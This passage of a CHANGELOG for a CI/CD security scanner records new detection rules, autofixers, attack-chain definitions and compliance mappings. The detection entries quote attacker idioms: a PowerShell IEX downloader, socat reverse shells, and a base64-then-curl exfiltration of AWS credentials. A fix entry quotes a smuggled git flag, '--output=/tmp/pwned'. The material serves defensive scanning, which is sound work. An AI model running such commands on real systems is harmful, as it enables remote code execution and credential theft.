    DF-010 / DF-011 / HELM-002 / HELM-003 / HELM-004 / HELM-008).
  - PS.* (protect software, integrity, provenance) for credential
    and signing rules (BK-002 / BK-009 / BK-010 / BK-011 /
    DF-006 / DF-016 / DF-019 / DF-020 / HELM-002 / HELM-010).
  - PO.5.1 / PW.9.1 (env separation, secure defaults) for
    privileged / root / sensitive-port rules (BK-005 / BK-007 /
    BK-013 / DF-002 / DF-008 / DF-012 / DF-013 / DF-014 / DF-015 /
    DF-017 / DF-018).
  - PO.3.3 (audit trail) for hygiene fields (HELM-005 / HELM-007
    / DF-007 / HELM-010).
  - RV.1.1 (vulnerability response) for scanning / health-check
    rules (BK-012 / DF-007).
  Standards coverage per provider now: Buildkite 8/14 -> 9/14,
  Dockerfile 2/14 -> 3/14, Helm 9/14 -> 10/14.
- **Buildkite / Tekton / Argo each gain autofixer coverage.** All
  three providers had 13 rules and zero fixers — the only thin
  spots in the catalog after rounds 22-24 expanded their rule
  packs. Eight new fixer registrations close the gap by re-using
  the cross-provider helpers the GHA / GL / BB / ADO / CC / JF
  packs already ride on (no new patching logic, just additional
  ``register(...)`` entries plus one composed fixer for the
  TKN-008 / ARGO-008 case that bundles two primitives):
  - **BK-002 / TKN-005 / ARGO-006** (literal secret in pipeline
    body) join ``_fix_gha008`` — replaces credential-shaped RHS
    values with ``"<REDACTED>"`` and leaves a rotate-and-wire-up
    TODO comment.
  - **BK-004** (curl-pipe) joins ``_comment_curl_pipe``.
  - **BK-005** (docker insecure flags) joins
    ``_strip_docker_flags`` for ``--privileged`` / ``-v`` /
    ``--cap-add`` / ``--net=host``.
  - **BK-008** (TLS bypass) joins ``_comment_tls_bypass``.
  - **TKN-008 / ARGO-008** (curl-pipe **OR** TLS bypass) get a
    new composed fixer that chains both primitives, since each
    rule can fire on either shape.
  Catalog autofixers: 103 → 111. Per-provider counts:
  Buildkite 0 → 4, Tekton 0 → 2, Argo 0 → 2; the three thinnest
  packs now run with the rest. 13 new tests in
  ``tests/test_autofix.py`` lock per-fixer behavior plus the
  composed-fixer dispatch and idempotency. README / docs / usage
  numerical claims bumped 103 → 111; provider docs regenerated
  to surface the autofix chip on every newly-covered rule.
- **Three new malicious-activity patterns covering canonical
  attacker idioms the catalog missed.** ``_malicious.py`` gains
  PowerShell IEX downloader detection (``IEX (New-Object
  Net.WebClient).DownloadString(...)`` and the
  ``Invoke-WebRequest | IEX`` / ``iwr | iex`` short forms — the
  Cobalt-Strike / commodity-malware loader shape), socat reverse
  shells (``TCP-LISTEN:port EXEC:bash``, the ``TCP:host:port
  SYSTEM:`` connect-back form, and the ``OPENSSL:host:443 EXEC:``
  TLS-tunneled variant — covers the reverse-shell tooling missed
  by the existing bash / nc / perl / python patterns), and base64-
  encoded credential exfil (``base64 ~/.aws/credentials | curl
  ...`` and peers — real intrusions prefer encoded over plain text
  to defeat keyword-based IDS). Each new pattern is wired through
  the existing ``find_malicious_patterns()`` dispatch, so every
  ``*-027`` / ``*-025`` / ``*-029`` / ``CB-011`` malicious-activity
  rule across the providers picks them up without per-rule edits.
  New ``tests/test_malicious_patterns.py`` (23 cases) locks
  positive matches, negative cases for benign sibling idioms (a
  legit ``Invoke-WebRequest`` that doesn't pipe to IEX, socat as
  a TCP relay, base64 of a build artifact), and three suppression
  invariants so a future ``looks_like_example`` rewrite can't
  silently start letting real hits through.
- **Five new credential detectors plus encrypted PKCS#8 PEM block
  detection.** ``_patterns.SECRET_DETECTORS`` adds Cohere
  production keys (``co_pat_<40+>``), Replicate API tokens
  (``r8_<40>``), Asana personal access tokens
  (``1/<account-id>:<32-hex>``), Square access tokens
  (``sq0(atp|csp)-<token>``), and Terraform Cloud / Enterprise
  tokens (``<14-alnum>.atlasv1.<60+>`` — the literal
  ``.atlasv1.`` middle segment makes the regex tight enough to
  not collide with arbitrary base62). ``PEM_BLOCK_RE`` now also
  matches ``-----BEGIN ENCRYPTED PRIVATE KEY-----`` (PKCS#8
  password-protected form) — still a credential leak even when
  the body is encrypted, since offline brute-force is cheap once
  the file leaves the perimeter. Per-detector positive + negative
  cases land in ``tests/test_secret_detection.py`` (99 → 111
  cases).
- **Six new TLS-verification-bypass patterns in
  ``_primitives/tls_bypass.py``.** Adds Docker daemon / CLI
  ``--insecure-registry`` (the ``dockerd`` startup-script idiom
  for talking to an internal registry over plain HTTP), Maven /
  Gradle JVM-property opt-outs
  (``-Dmaven.wagon.http.ssl.insecure=true``,
  ``-Dorg.gradle.https.insecure=true``,
  ``systemProp.https.insecure=true``), and AWS CLI bypasses
  (``AWS_S3_NO_VERIFY_SSL=true`` env var, ``aws --no-verify-ssl``
  request flag). Every existing ``*-023`` TLS-bypass rule across
  the providers picks them up via the shared primitive without
  per-rule edits.
- **New ``checks/_primitives/local_mock.py`` primitive.** One
  source of truth for "this env block points at a LocalStack /
  Moto / kind / k3d local mock." Exports ``LOCAL_ENDPOINT_RE``
  (anchored localhost / 127.0.0.1 / ::1 matcher),
  ``env_targets_local_mock(env)`` (any AWS / k8s endpoint pointed
  at localhost), and ``env_has_localstack_sentinel(env)`` (the
  combined "localhost endpoint + literal ``test`` access keys"
  signal). GHA-005 and GHA-014 both consume it; future rules with
  the same FP risk plug in by importing.

### Changed

- **``RULE.known_fp`` is now populated on 25 demoted rules and
  rendered in provider docs.** The ``--explain CHECK-ID`` and
  provider-doc surfaces previously dropped the ``known_fp`` field
  for any rule whose confidence default lived in
  ``_confidence.py`` rather than in the rule module — readers had
  no way to see *why* a rule defaulted to LOW or MEDIUM. Anchored
  on three already-documented IDs (GHA-016 curl-pipe, GHA-027
  malicious-activity, GHA-008 credential-literal) and propagated
  the same prose to the GitLab / Bitbucket / Azure DevOps /
  Jenkins / CircleCI / CodeBuild peers across the curl-pipe,
  malicious-activity, credential-literal, dep-update, and
  outdated-image rule families. ``scripts/gen_provider_docs.py``
  now renders ``known_fp`` as a "Known false-positive modes"
  bullet list between the body prose and the recommendation block,
  closing the drift between ``--explain`` (which had been
  rendering it) and the published provider-reference docs (which
  had been dropping it).
- **CLI per-provider path detection collapses into a small
  helper.** ``main()``'s 16-block elif ladder for
  ``--<provider>-path PATH`` resolution becomes one helper
  (``_resolve_provider_path``) plus 12 one-call dispatches.
  ``cloudformation`` (template-folder probe) and ``helm``
  (``--helm-values`` validation) stay inline because their
  contracts don't fit the table. Net: ``cli.py`` shed ~150 lines.
  Adding the next provider is now a 6-line table entry instead of
  a 15-line elif block.
- **``autofix.py`` split into a package.** The 1,910-line file
  becomes ``autofix/__init__.py`` (the public surface —
  ``register``, ``generate_fix``, ``render_patch``,
  ``available_fixers``, ``_FIXERS``, ``Fixer``) plus
  ``autofix/_impl.py`` (the 100+ fixer implementations). The
  package facade runs every ``@register(...)`` decorator at
  import time via a side-effect import from ``__init__``. Future
  contributors can drop a per-provider sibling module
  (``autofix/k8s.py``, ``autofix/dockerfile.py``) and wire it into
  ``__init__`` with one line; the public API is unchanged. No
  behavior change for callers.
- **Scanner extracts ``_build_context``.** The diff-filter +
  ``post_filter`` hook + warning-capture logic moves out of
  ``Scanner.__init__`` into a ``_build_context()`` method so tests
  can substitute their own context-building strategy without
  re-implementing the rest of Scanner construction. The
  ``import fnmatch`` lazy imports inside ``run()`` and
  ``inventory()`` get hoisted to module scope. ``_load_custom_rules``
  no longer hand-maintains a 9-package list — rule packages come
  from a filesystem glob mirroring the CLI's existing approach,
  so adding a new provider's ``rules/`` subpackage automatically
  participates in collision detection without a registry edit.
- **``__version__`` is a single source of truth literal.** Drops
  the ``importlib.metadata.version("pipeline_check")`` lookup that
  silently went stale on editable installs whenever
  ``pyproject.toml`` got bumped without a reinstall, producing a
  misleading ``--version`` for contributors. The literal stays
  the canonical source; the release script bumps it alongside
  ``[project] version`` in ``pyproject.toml`` and the ``vX.Y.Z``
  git tag.

### Fixed

- **TLS-bypass autofixer recall on uppercase env vars.**
  ``_comment_tls_bypass`` matched ``TLS_BYPASS_RE`` (a case-
  sensitive lowercase pattern shared with the detection rules
  that always run against ``blob_lower(doc)``) directly against
  the raw original-case lines, so uppercase env-var assignments
  like ``NODE_TLS_REJECT_UNAUTHORIZED=0`` and
  ``GIT_SSL_NO_VERIFY=1`` were detected but never fixed. Now
  searches against ``line.lower()`` while still emitting the
  operator's original-case line in the commented-out output.
  Surfaced while wiring TKN-008 and ARGO-008 onto the same
  primitive; a longstanding silent gap on the GHA / GL / BB /
  ADO / CC / JF ``*-023`` rules too.
- **Argument-injection (CWE-88) hardening on ``--diff-base`` and
  ``--baseline-from-git``.** Both flags compose user-controlled
  values into git as positional arguments via f-string
  (``f"{base_ref}...HEAD"``, ``f"{ref}:{path}"``). Git parses any
  argv element starting with ``-`` as an option even when it
  appears in a positional slot, so a value like
  ``--output=/tmp/pwned`` would have been interpreted by
  ``git diff`` as a write-to-arbitrary-path flag rather than a
  rev. Two layers of defense land here: the ``diff.py`` helpers
  reject any leading-``-`` ref / path with a clear ValueError
  (covers CLI users, library callers, and config-file driven
  invocations uniformly), and the same git invocations now pass
  ``--end-of-options`` (git 2.24+) so even an internal regression
  that forgot the ref check can't smuggle a flag past the
  positional cutoff. The CLI raises ``UsageError`` instead of the
  lower-layer ``ValueError`` so operators see the same error
  shape as for other input-validation failures. Eight new
  parameterized tests in ``tests/test_diff_mode.py`` lock the
  rejection path and the argv-shape invariant.
- **``produces_artifacts`` heuristic recognizes GitHub Pages
  workflows.** A workflow using ``actions/deploy-pages`` can only
  ship a static documentation site, never a software artifact —
  but the heuristic's bare ``deploy`` / ``publish`` substring
  tokens used to match action names like ``actions/deploy-pages``
  and step names like "Deploy to GitHub Pages", causing GHA-006
  / GHA-007 / GHA-020 / GHA-024 (signing / SBOM / vuln-scan /
  SLSA-attest) to fire on docs-only workflows. Now returns
  ``False`` outright when ``actions/deploy-pages`` appears
  anywhere; sibling Pages-action substrings (``upload-pages-
  artifact``, ``configure-pages``) are pre-stripped from the blob
  before the bare-token match runs so a hybrid workflow (real
  publish + docs site) still detects via its real artifact token.
- **GHA-005 no longer fires on LocalStack / Moto sentinel envs.**
  A step pairing ``AWS_ENDPOINT_URL`` at a localhost address with
  the literal ``test`` access keys is talking to a local mock —
  boto3 / aws-sdk would refuse those credentials against real
  AWS, so the long-lived-keys violation was a false positive.
  Detection is structural and conservative (both signals
  required), so a workflow that hardcodes ``test`` keys without a
  localhost endpoint still fires.
- **GHA-014 skips deploy commands against a local mock.** A job
  whose env block (or any of its steps' envs) carries
  ``AWS_ENDPOINT_URL`` or ``KUBE_API_URL`` at a localhost
  address is an integration test, not a deploy. ``terraform
  apply`` against LocalStack no longer requires a GitHub
  ``environment:`` gate.
- **``tests/test_doc_claims.py`` derives its catalog total from
  code.** Previously hardcoded ``_AWSLIKE_TOTAL = 71 + 63``
  (literally violating the test's own promise that "numbers come
  from code"). Now scans the AWS / Terraform / CloudFormation
  modules for ``check_id="..."`` literals and sums dynamically.
  Tolerance tightened from 50 to 20 since the count is no longer
  hand-maintained. Catalog total floor on README and
  ``docs/index.md`` bumped 500+ → 520+ to match.
- **``pyproject.toml`` gains ``[project.optional-dependencies]
  dev``.** The ``Makefile install`` target was running
  ``pip install -e ".[dev]"`` against a non-existent extra. The
  new extra mirrors ``requirements-dev.in`` (floor versions only;
  the hash-locked, reproducible install lives in
  ``requirements-dev.txt``).
- **``requirements-dev.txt`` actually pins ruff and mypy.** The
  ``ci:`` lint and type-check steps had been doing
  ``pip install ruff`` / ``pip install mypy`` un-pinned because
  neither was actually in the lockfile despite both being in
  ``requirements-dev.in``. Regenerated the lockfile so both ride
  the hash-pinned install path; pinned ``mypy<2.0`` because
  mypy 2.0 tightens ``no-untyped-call`` against several PyYAML
  helpers (lifting that pin is its own follow-up). Dropped the
  ``disable_error_code = ["import-untyped"]`` placeholder in
  ``pyproject.toml`` now that ``types-PyYAML`` actually resolves
  through the lockfile, with per-call ``# type: ignore[no-
  untyped-call]`` markers on the handful of PyYAML constructor
  helpers the stubs annotate as untyped.
- **MANIFEST hygiene + cross-platform Makefile.** ``MANIFEST.in``
  excludes ``.pre-commit-hooks.yaml`` alongside the existing
  ``.pre-commit-config.yaml`` exclusion, both as defense in depth
  against either landing in a published sdist. ``make install``
  switches to the same hash-locked ``requirements-dev.txt`` flow
  CI uses, removing the broken ``pip install -e ".[dev]"`` call.
  ``make clean`` runs through a Python one-liner so it works on
  Windows. ``make lint`` now also covers ``scripts/`` (where a
  malformed ``# noqa: ANN001.`` directive — period instead of
  whitespace — had been silently tripping a ruff warning).
- **One ruff ``E501`` long-line and one stale-noqa warning.**
  Wrapped ``ac013_caller_runner_token_persist.py:24`` (was 126
  chars) and rewrote the malformed
  ``scripts/gen_attack_chains_doc.py:60`` ``# noqa`` directive
  ruff was logging at every run.
- **Runtime image no longer ships base-image pip.** The
  ``runtime`` stage of the project ``Dockerfile`` installed the
  pre-built wheel using the ``pip`` that came with
  ``python:3.12-slim``, which trails upstream by months and was
  flagged by image scanners for CVE-2025-8869, CVE-2026-6357, and
  CVE-2026-1703 (all fixed in current ``pip``). The builder stage
  already upgrades pip; the runtime stage now does the same before
  the wheel install so the final layer carries a current pip. No
  behavior change for users of the CLI; the remaining
  scanner-reported CVEs against the image are Debian system
  packages without upstream fixes and ride the regular
  ``python:3.12-slim`` rebuild cadence.

### Changed

- **PR CI is faster and cancels stale runs.** ``python-app.yml``
  splits into three jobs (``lint`` / ``typecheck`` / ``test``)
  instead of running ruff + mypy + pytest sequentially inside every
  matrix leg. Ruff and mypy now run once on 3.12 in parallel with
  the pytest matrix (Ubuntu 3.11 / 3.12 / 3.13 + Windows 3.12),
  cutting the long-pole wait when one of them is the slow step
  and saving three redundant mypy invocations per PR. All three
  CI workflows (``python-app.yml``, ``codeql.yml``, ``dogfood.yml``)
  gain a ``concurrency`` group keyed on workflow + ref that cancels
  stale PR runs when a new commit lands on the same branch (master
  pushes keep the standard "don't cancel" posture). All three also
  gain a ``paths-ignore`` filter that skips PR runs touching only
  ``docs/`` / ``bench/`` / ``*.md`` / ``mkdocs.yml`` (docs PRs are
  already covered by ``docs.yml``, which is paths-gated to
  ``docs/**`` and ``mkdocs.yml``). CodeQL's weekly cron still runs
  the full scan against master regardless of which PR-paths
  changed in between, so the paths-ignore filter is a PR-feedback
  speedup, not a coverage reduction.
- **README and usage docs surface the container distribution.**
  The project ships a multi-arch (`linux/amd64` + `linux/arm64`)
  image to Docker Hub (``dmartinochoa/pipeline-check``) and GHCR
  (``ghcr.io/dmartinochoa/pipeline-check``) on every release, but
  the README quick-start and ``docs/usage.md`` install section only
  documented ``pip install``. README quick-start gains a ``docker
  run`` example pointing at both registries; ``docs/usage.md``
  gains a "Container image" subsection covering tag flavors,
  digest-pinning, and the ``/scan`` bind-mount convention. README
  badge row gains PyPI version + Docker Hub version badges so the
  dual distribution is visible at a glance.
- **Tag-push triggers PyPI + Docker publish automatically.**
  ``release.yml``'s ``publish-testpypi`` and ``publish-pypi`` jobs
  previously required an operator to run the workflow via the
  Actions UI with ``inputs.publish: true``; pushing a ``v*.*.*``
  tag built the artifacts but did not ship them. The publish gate
  is now the ``production`` GitHub environment binding (configurable
  under Settings -> Environments -> ``production`` with required
  reviewers), which is auditable and survives operator turnover.
  ``docker-publish.yml`` adds the matching ``push: tags: [v*.*.*]``
  trigger and continues to gate on the ``container-registry``
  environment. ``workflow_dispatch`` stays available on both
  workflows for re-runs and feature-branch preview builds; the
  ``inputs.publish`` toggle still gates dispatch-mode publishes so
  a dispatch from ``dev`` cannot ship to public indexes.

### Added

- **AC-025 — Argo param injection lands in a privileged or root
  step.** New cross-rule attack chain on the Argo Workflows
  surface, mirroring the AC-023 shape (Tekton). Fires when the
  same Argo Workflow / WorkflowTemplate /
  ClusterWorkflowTemplate carries ARGO-005 (a template's
  ``script.source`` or container ``command`` / ``args``
  interpolates ``{{inputs.parameters.<name>}}`` /
  ``{{workflow.parameters.<name>}}`` into the shell body without
  quoting) AND ARGO-002 (the same template runs ``privileged:
  true``, ``runAsUser: 0``, or with node-level
  ``capabilities.add``). The combination converts an Argo trigger
  surface — Argo Events Sensor webhook, CronWorkflow trigger,
  WorkflowEventBinding fork-PR path, direct ``argo submit`` — into
  in-pod shell execution inside a kernel-privileged container.
  Distinct from AC-021 (default-SA + K8S-029 RoleBinding lateral-
  movement shape); AC-025 is the *trigger-to-execution* shape on
  the Argo side, and is independent of ServiceAccount /
  RoleBinding configuration since the escape route is the node
  rather than the K8s API. Severity CRITICAL, MITRE ``T1059`` /
  ``T1068`` / ``T1611``, kill-chain ``initial-access -> execution
  -> privilege-escalation``. Auto-discovered; ``--list-chains``
  and ``--explain-chain AC-025`` pick it up; ``--explain
  ARGO-002`` and ``--explain ARGO-005`` now list AC-025 under
  "Triggers attack chains". Catalog 24 -> 25. Argo chain
  coverage 1 -> 2 (AC-021 + AC-025), with the two chains on the
  Argo surface now spanning two genuinely distinct attack stages.
- **AC-024 — OIDC trust drift lands on a mutable ECR tag.** New
  cross-provider attack chain (github / aws). Fires when a scan
  carries GHA-030 (a workflow requests an OIDC token without an
  ``environment:`` binding on the requesting job, so any branch
  or fork PR can redeem the role with no required-reviewer gate)
  AND ECR-002 (an ECR repository allows mutable image tags). Any
  branch or fork PR that triggers the workflow obtains short-
  lived AWS credentials; if those credentials reach an ECR push
  role, the mutable-tag policy lets the workflow overwrite an
  existing tag and the substituted image propagates to every
  consumer that pulls by name (``imagePullPolicy: Always``,
  digest-less manifests). Distinct attack vector from the existing
  GHA-030 / ECR-002 chains: AC-016 = GHA-030 + IAM-002 (drift
  meets *wildcard authority*), AC-017 = GHA-011 + ECR-002 (cache
  poisoning meets writable surface), AC-024 = drift meets
  writable surface — narrow authority but a supply-chain blast
  radius. Severity CRITICAL, MITRE ``T1078.004`` / ``T1195.002``
  / ``T1525``, kill-chain ``initial-access -> credential-access
  -> impact``. Auto-discovered; ``--explain GHA-030`` and
  ``--explain ECR-002`` now list AC-024 alongside their existing
  chain references. Catalog 23 -> 24.
- **AC-023 — Tekton param injection lands in a privileged or root
  step.** New cross-rule attack chain. Fires when the same Tekton
  ``Task`` / ``ClusterTask`` carries TKN-003 (a step's ``script:``
  interpolates ``$(params.<name>)`` into the shell body without
  quoting) AND TKN-002 (the same step runs ``privileged: true``,
  ``runAsUser: 0``, or with node-level ``capabilities.add``). The
  combination converts a PipelineRun trigger surface — webhook
  payload routed through a Tekton EventListener, GitOps merge,
  fork-PR-triggered CEL Trigger filter — into in-pod shell
  execution inside a kernel-privileged container, the two
  ingredients for a Kubernetes node escape. Distinct from AC-020
  which captures the *static-RBAC* lateral-movement shape; AC-023
  captures the *trigger-to-execution* shape on the Tekton side
  alone. Severity CRITICAL, MITRE ``T1059`` / ``T1068`` / ``T1611``,
  kill-chain ``initial-access -> execution -> privilege-
  escalation``. Auto-discovered; ``--list-chains`` and
  ``--explain-chain AC-023`` pick it up, ``--explain TKN-002`` and
  ``--explain TKN-003`` now list AC-023 under "Triggers attack
  chains". Catalog 22 -> 23. Tekton chain coverage 1 -> 2.
- **AC-022 — GitLab script injection lands on deploy job with no
  manual gate.** New cross-rule attack chain. Fires when the same
  ``.gitlab-ci.yml`` carries GL-002 (a job's ``script:``
  interpolates an attacker-controlled context field — commit
  title, MR description, branch / tag name) AND GL-004 (a deploy
  job has no ``when: manual`` and no protected ``environment:``
  binding). The combination converts a fork-MR-controllable
  injection point into an unattended production push, which is
  the GitLab analog of AC-002 (``GHA-003`` + ``GHA-014``) — every
  CI provider with a script-injection primitive and a deploy-gate
  primitive can compose this same shape, but until now the chain
  catalog had AC-002 for GitHub and nothing for GitLab. Severity
  CRITICAL, MITRE ``T1059`` / ``T1078`` / ``T1556``, kill-chain
  ``initial-access -> execution -> impact``. Closes a real
  coverage gap: of the catalog's 22 chains, GitLab now has two
  (AC-014 covered the runner-token persistence shape; AC-022
  covers the injection-to-deploy shape). Auto-discovered;
  ``--list-chains`` and ``--explain-chain AC-022`` pick it up,
  ``--explain GL-002`` and ``--explain GL-004`` now list AC-022
  under "Triggers attack chains". Catalog 21 -> 22.
- **CIS Kubernetes Benchmark v1.10 — new compliance standard.**
  Adds the 14th registered standard. Covers Section 5 (Policies)
  of the benchmark — the workload-manifest controls a posture-
  from-YAML scanner can evidence: 5.1 RBAC and Service Accounts
  (cluster-admin minimization, wildcard verbs, default-SA bindings,
  token-automount), 5.2 Pod Security Standards (privileged,
  hostNamespaces, allowPrivilegeEscalation, runAsRoot,
  capabilities, seccomp, hostPath, hostPort), 5.3 NetworkPolicies
  (default-deny, allow-list enforcement), 5.4 Secrets Management
  (env-mounted credentials, plaintext data), 5.7 General Policies
  (namespace separation, default-namespace avoidance,
  SecurityContext applied broadly). Sections 1-4 (control-plane
  components, etcd, kubelet) require live cluster inspection and
  are intentionally out of scope — run ``kube-bench`` for those.
  31 of the 40 K8s rules + 6 cross-cutting K8s-related rules map
  to 24 controls; ``--list-standards``, ``--standard-report
  cis_kubernetes``, ``pipeline_check --standard cis_kubernetes``,
  and SARIF tag ``cis_kubernetes`` all pick it up automatically.
  Catalog standards count 13 to 14; updated README +
  ``docs/index.md`` claim, plus ``docs/standards/cis_kubernetes.md``
  reference page mirroring the cis_aws_foundations doc shape.
  Floor in ``test_floors_hold`` set to 7% (the standard is
  intentionally K8s-narrow, like cis_aws_foundations is AWS-narrow,
  so catalog-wide coverage caps at the K8s-pack share).
- **NIST CSF 2.0 + SOC 2 mappings for the K8s + Helm packs.** Both
  standards previously had **zero** entries for the entire
  Kubernetes (40 rules) and Helm (10 rules) packs, so
  ``--standard-report nist_csf_2`` and ``--standard-report soc2``
  rendered every K8s or Helm finding as "unmapped". Round 28 closed
  this for PCI DSS v4 + S2C2F across the BK / TKN / ARGO packs;
  this round closes it for the K8s and Helm packs across the two
  remaining standards that already covered the rest of the catalog.
  CSF 2.0 picks up 50 new mappings: every K8S-001..040 rule
  routed across PR.PS (platform security), PR.AA (access), PR.IR
  (network), PR.DS (data integrity), DE.CM (continuous
  monitoring), and GV.SC (supply chain) plus all 10 HELM-* rules
  on the GV.SC supply-chain function. Catalog-wide coverage:
  59% to 72%; floor bumped 59 -> 70. SOC 2 picks up 38 new
  mappings concentrated in CC6 (logical access — RBAC, SA tokens,
  credentials), CC6.6 (network boundary), CC6.7 (data in transit),
  CC6.8 (malicious software prevention — privileged containers,
  hostPath escapes, runtime hardening), CC7.1 / CC7.2 (config
  drift / monitoring), and CC8.1 (change management — image
  pinning, chart pinning, attestation). Catalog-wide coverage:
  39% to 51%; floor bumped 39 -> 49. The standards-mapping picture
  for the catalog's 14 frameworks is now consistent across every
  rule pack — no more "drag-down by zero coverage" floor wobble
  when a pack expands.
- **Five new K8s posture rules (`K8S-036`..`K8S-040`).** Extends the
  Kubernetes pack with one cross-doc supply-chain check, two
  secrets / network gaps, and two runtime-isolation checks.
  ``K8S-036`` (cross-doc) walks every ``ServiceAccount``'s
  ``imagePullSecrets`` and confirms each named ``Secret`` exists
  in the same namespace within the manifest set; a dangling
  reference doesn't fail apply but causes silent fallback to
  anonymous registry pulls (MEDIUM). ``K8S-037`` is the ConfigMap
  companion to K8S-018 — walks ``data`` / ``binaryData`` for AKIA-
  shaped values and credential-shaped key names. ConfigMaps have
  much broader RBAC scope than Secrets, so credentials leaked
  this way reach a wider audience (HIGH). ``K8S-038`` is the
  inverse of K8S-032 — fires when a NetworkPolicy carries an
  ingress / egress rule with an empty ``from: []`` / ``to: []``
  (or missing field), which is K8s shorthand for "match every
  peer". The false-sense-of-security failure mode is worse than
  no policy (MEDIUM). ``K8S-039`` flags pods that set
  ``spec.shareProcessNamespace: true`` — collapses PID isolation
  between containers and lets a compromised sidecar enumerate
  every primary container's processes / env vars (MEDIUM).
  ``K8S-040`` flags containers with ``securityContext.procMount:
  Unmasked`` — undoes the kernel-info masking under ``/proc``
  that the default ``Default`` procMount applies, exposing
  ``/proc/kcore`` / ``/proc/keys`` / writable ``/proc/sys`` (HIGH).
  Provider catalog: 35 to 40 K8s rules. 25 new tests in
  ``tests/kubernetes/test_k8s036_040_posture_gaps.py`` covering
  per-rule positive / negative cases, cross-namespace SA-pullsecret
  isolation (K8S-036), binaryData base64 decode (K8S-037),
  init-container coverage (K8S-040), and Deployment-template
  walks (K8S-039); OWASP / NIST 800-53 / NIST 800-190 mappings
  added; README + ``docs/index.md`` provider listings + Helm
  K8S-* count + kubernetes.md provider doc regenerated;
  ``insecure.yaml`` / ``secure.yaml`` fixtures extended to
  exercise / pass every new rule. ``nist_csf_2`` floor 60 -> 59
  and ``soc2`` floor 40 -> 39 to absorb the denominator widening
  from the new rules — neither standard has any K8s mappings to
  draw from.
- **PCI DSS v4 + S2C2F mapping backfill across BK / TKN / ARGO.**
  Rounds 22-24 added 15 new rules (BK-009..013, TKN-009..013,
  ARGO-009..013) but only mapped them across 7 of the 13
  standards. PCI DSS v4 had **zero** entries for the entire
  Buildkite, Tekton, and Argo packs — every rule fell through
  to "unmapped" in ``--standard-report pci_dss_v4``. S2C2F was
  similarly missing the three packs' supply-chain rules. This
  round backfills both.
  PCI DSS v4 picks up 39 new mappings: BK / TKN / ARGO 1..13
  each, slotted into the same Req-6 / Req-7 / Req-8 / Req-10
  controls the older CI providers already use (e.g.,
  artifact-signing rules → 6.5.1 + 10.3.2; vuln-scan rules →
  6.3.1 + 6.3.3; sidecar / SA-token rules → 6.4.1 / 7.2.5).
  Catalog-wide coverage: 18% to 29%; floor bumped 18 -> 27.
  S2C2F picks up 21 new mappings concentrated in the practices
  the new rules actually evidence: REB-2 (signing), REB-3
  (SBOM), REB-4 (signed-SBOM / provenance), SCA-1 (vuln scan),
  ING-1 (untrusted source / TLS bypass), UPD-1 (pinning), ENF-1
  (deploy gates). Catalog-wide coverage: 25% to 31%; floor
  bumped 25 -> 29.
- **Two cross-provider attack chains (`AC-020` / `AC-021`).**
  ``AC-020`` "Tekton hostPath build workload meets cluster-admin
  RBAC" fires when ``TKN-004`` (Tekton Task mounts hostPath /
  shares host namespaces) and ``K8S-020`` (cluster-admin
  ClusterRoleBinding) both trip in the same scan. The Tekton-
  layer mirror of AC-011: a TaskRun the build pipeline kicks off
  has both node-level filesystem access and cluster-wide API
  authority, so a compromised Task spec turns into static-pod
  backdoor + cluster-wide credential harvest. Severity CRITICAL.
  MITRE T1611 + T1098.003 + T1078. ``AC-021`` "Argo default-SA
  workflow lands on a default-SA RoleBinding" fires when
  ``ARGO-003`` (workflow uses the default ServiceAccount) and
  ``K8S-029`` (RoleBinding grants verbs to the default SA) both
  trip. ARGO-003 alone is a hygiene gap; K8S-029 alone is a
  hygiene gap; together the combination turns "use a custom SA"
  into a concrete privilege-escalation primitive — anyone who
  can submit a Workflow runs code under whatever verbs the
  RoleBinding grants. Severity HIGH. MITRE T1078 + T1098.003.
  Catalog: 19 chains to 21. 12 new tests in
  ``tests/test_attack_chains.py`` covering both legs failing,
  each leg alone, both passing, kill-chain phase, MITRE codes,
  resource dedup, and confidence inheritance;
  ``docs/attack_chains.md`` registered-chains table extended
  + catalog cards regenerated; README headline 19 to 21 chains.
- **`--explain` v2: `[Related rules]` and `[Autofixable]` sections.**
  Finishes the cross-reference triangle that round 19 started. The
  ``[Triggers attack chains]`` section already cross-referenced
  rule -> chain; this round adds rule -> sibling rules and rule ->
  autofix.
  ``[Related rules]`` lists checks in the same topic cluster
  (same threat / different layer, or same control / different
  provider). 18 clusters cover the major patterns: K8s
  securityContext (K8S-005/006/007/035), K8s RBAC, K8s
  ServiceAccount, cross-provider literal-secrets / script-injection
  / image-pinning / signing / SBOM / SLSA-provenance / vuln-
  scanning / TLS-bypass / curl-pipe / deploy-gate / self-hosted-
  ephemeral / token-persistence. So ``--explain GHA-008`` now
  surfaces ``GL-008``, ``BB-008``, ``ADO-008``, ``JF-008``,
  ``CC-008``, ``BK-002``, ``TKN-005``, ``ARGO-006`` — the same
  literal-secret threat across every provider in the repo. A
  regression test walks every cluster entry and asserts the IDs
  resolve through the explain index, so a typo trips at CI.
  ``[Autofixable]`` says "Yes" with a CLI hint when the check has
  a registered fixer (``autofix.available_fixers()``); the section
  is omitted otherwise. Doesn't distinguish comment-only vs
  structural — that lives in the patch ``--fix`` emits.
- **SARIF results now carry stable `partialFingerprints`.**
  Every result in the SARIF payload now includes a
  ``partialFingerprints.pipelineCheckV1`` entry — a SHA-256 of
  ``(check_id, normalized path, snippet of the offending line)``.
  GitHub Code Scanning (and GitLab / Azure DevOps) use this to
  match the same finding across runs: an unchanged repo no longer
  re-alerts on every push, and a fix that edits the offending
  line produces a new fingerprint that triggers GHCS to resolve
  the prior alert. Path normalization (``\\`` -> ``/``, lowercase
  on Windows) keeps the hash stable across cross-platform CI;
  whitespace in the snippet is collapsed so a Prettier re-indent
  doesn't invalidate every alert. Findings without a readable
  Location (AWS resources, Terraform plan output, in-memory test
  fixtures) fall back to ``(check_id, resource)`` only — still
  stable across runs but missing the line-content cache-buster.
  Attack chains get the same treatment, with a fingerprint
  derived from ``(chain_id, sorted resources, sorted triggering
  check ids)`` so a re-ordering of the finding list produces
  the same fingerprint. Eight new tests in
  ``tests/test_sarif_reporter.py`` lock the stable / changes-
  on-fix / unchanged-on-unrelated-edit / cross-resource /
  fallback semantics.
- **Five new Argo Workflows rules (`ARGO-009`..`ARGO-013`).**
  Closes the third (and last) thin-pack pattern — Argo shipped at
  8 rules while every other CI provider averaged 30+. The four
  artifact-control rules reuse the shared signing / SBOM /
  provenance / vuln-scan primitives so detection is consistent
  with the BK / TKN packs that landed in the previous two
  rounds. ``ARGO-009`` fires when an artifact-producing Workflow
  invokes no signing tool (cosign / sigstore / slsa-framework /
  notation) (MEDIUM). ``ARGO-010`` fires when an artifact-
  producing Workflow has no SBOM step (syft / cyclonedx /
